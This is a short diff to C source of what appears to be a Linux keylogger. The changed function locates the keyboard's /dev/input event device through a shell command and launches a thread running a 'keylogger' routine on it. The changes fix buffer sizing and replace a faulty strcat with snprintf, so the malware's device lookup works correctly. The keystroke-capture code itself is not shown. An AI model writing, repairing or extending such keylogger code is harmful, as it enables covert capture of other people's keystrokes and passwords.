@@ -29,7 +29,7 @@ void debian_get_kb_device_filename(const char *command)
 
     pthread_t thread_logger = 0;
 
-    path = malloc(20 * sizeof(char));
+    path = malloc(32 * sizeof(char));
     if(path == NULL)
         debian_error("malloc()\nFunction : debian_get_kb_device_filename()");
 
@@ -41,13 +41,15 @@ void debian_get_kb_device_filename(const char *command)
         debian_error("popen()\nFonction : debian_get_kb_device_filename()");
 
     /*  Put the result of the command in a buffer */
-    if(fgets(temp, 9, pipe) == NULL)
+    if(fgets(temp, 7, pipe) == NULL)
         debian_error("fgets()\nFonction : debian_get_kb_device_filename()");
 
     pclose(pipe);
 
-    strdup(strcat(path, temp));
-
+    //strdup(strncat(path, temp, strlen(temp) + 1));
+    
+    snprintf(path, 32, "%s%s", "/dev/input/", temp);
+    
     printf("path = %s\n", path);
 
     if(pthread_create(&thread_logger, NULL, (void*)keylogger, path) == -1)
